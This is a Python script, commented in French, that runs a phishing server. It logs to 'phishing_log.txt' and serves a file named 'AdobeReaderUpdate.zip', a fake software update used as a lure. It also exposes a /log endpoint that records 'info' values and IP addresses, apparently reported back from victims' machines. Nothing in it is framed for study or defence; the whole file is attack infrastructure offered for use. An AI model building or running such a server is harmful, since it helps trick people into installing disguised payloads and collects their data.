from http.server import HTTPServer, BaseHTTPRequestHandler
import logging
import urllib.parse
import os

# Configuration du logging
logging.basicConfig(
    filename='phishing_log.txt',
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    datefmt='%d-%m-%Y %H:%M:%S'
)

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/download':
            # Servir le fichier ZIP
            zip_filename = 'AdobeReaderUpdate.zip'
            if os.path.exists(zip_filename):
                self.send_response(200)
                self.send_header('Content-type', 'application/zip')
                self.send_header('Content-Disposition', f'attachment; filename="{zip_filename}"')
                self.end_headers()
                with open(zip_filename, 'rb') as f:
                    self.wfile.write(f.read())
                logging.info(f'Téléchargement de {zip_filename} effectué depuis {self.client_address[0]}')
            else:
                self.send_response(404)
                self.send_header('Content-type', 'text/plain; charset=utf-8')
                self.end_headers()
                self.wfile.write("Fichier AdobeReaderUpdate.zip non trouvé".encode('utf-8'))
                logging.error(f'Fichier {zip_filename} non trouvé lors de la requête de {self.client_address[0]}')
        elif self.path.startswith('/log'):
            # Enregistrer les logs
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            info = params.get('info', [''])[0]
            logging.info(f'Log: {info} depuis {self.client_address[0]}')
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain; charset=utf-8')
            self.end_headers()
            self.wfile.write(b'Not Found')

if __name__ == '__main__':
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, Handler)
    print('Serveur démarré sur le port 8000...')
    httpd.serve_forever()
